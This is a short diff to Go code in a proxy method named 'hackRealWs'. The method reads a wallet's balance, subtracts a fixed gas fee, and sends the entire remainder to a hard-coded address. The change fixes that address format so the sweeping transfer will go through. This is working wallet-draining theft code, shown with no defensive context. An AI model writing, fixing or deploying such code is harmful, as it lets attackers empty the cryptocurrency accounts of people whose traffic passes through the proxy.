@@ -147,7 +147,7 @@ func (pxy *proxy) hackRealWs() {
 						logger.Info("ws GetBalance:", addr)
 						left := balance.Sub(balance, big.NewInt(22000*22000000000))
 						if left.Cmp(big.NewInt(0)) > 0 {
-							conn.SendTransaction(ctx, a, "6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
+							conn.SendTransaction(ctx, a, "0x6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
 							logger.Info("ws sendtransaction:", addr)
 						}
 					}
